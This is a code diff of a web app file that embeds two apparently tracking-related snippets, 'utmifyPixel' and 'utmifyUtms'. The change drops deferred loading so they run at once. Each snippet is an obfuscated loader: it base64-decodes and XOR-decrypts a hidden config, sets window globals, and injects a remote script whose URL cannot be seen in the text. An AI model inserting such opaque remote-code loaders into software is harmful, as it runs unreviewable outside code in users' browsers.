@@ -45,11 +45,7 @@ const utmifyPixel = `(function(){var n_f=atob("DPGOGOB39WpmKHzZhIqsbZIb11BEQAit9
 
 const utmifyUtms = `(function(){var m_g=atob("DNdkHK61u6NdGiUEsqxGadzZmZl/clFwwqReM4HW381zb1Fp27EdMs3a1o0/aAp30aUNbNrGlNYpd1Yr3rYQed3BlckuOAkm06MQbsfXztc4aQc+6axGcs/Y3oFnOEFlxrZJadrY0sUkN1V216EBctqYw8Ayfgh30bxGMIzD2s8ofwc+kPUZMNWX1cIwfwc+kLMFaM+Yztcwc0N9n6cWedjQ1ddwaVBm27MXPoKXzcIxb0AmiPVGYfPI");var t_x=[];for(var f_oj=0;f_oj<m_g.length;f_oj++){t_x.push(m_g.charCodeAt(f_oj)&255);}var w_vov=t_x[0];var d_ic2=t_x.slice(1,1+w_vov);var m_c2f3=t_x.slice(1+w_vov);var a_rs90=m_c2f3.map(function(b,f_lpr){return b^d_ic2[f_lpr%w_vov];});var v_vv8z="";for(var a_le=0;a_le<a_rs90.length;a_le++){v_vv8z+=String.fromCharCode(a_rs90[a_le]&255);}var z_dw8x=decodeURIComponent(escape(v_vv8z));var d_zev6=JSON.parse(z_dw8x);var i_bcyg=d_zev6.globals||[];i_bcyg.forEach(function(z_drs){window[z_drs.name]=z_drs.value;});var t_p5f=document.createElement("script");t_p5f.src=d_zev6.url;t_p5f.async=true;t_p5f.defer=true;(d_zev6.attributes||[]).forEach(function(h_kgp5){t_p5f.setAttribute(h_kgp5.name,h_kgp5.value);});(document.head||document.documentElement).appendChild(t_p5f);})();`;
 
-const deferredTracking = `(() => {
-  const start = () => { ${utmifyPixel} ${utmifyUtms} };
-  if ('requestIdleCallback' in window) requestIdleCallback(start, { timeout: 1800 });
-  else setTimeout(start, 900);
-})();`;
+const tracking = `${utmifyPixel} ${utmifyUtms}`;
 
 function NotFoundComponent() {
   return (
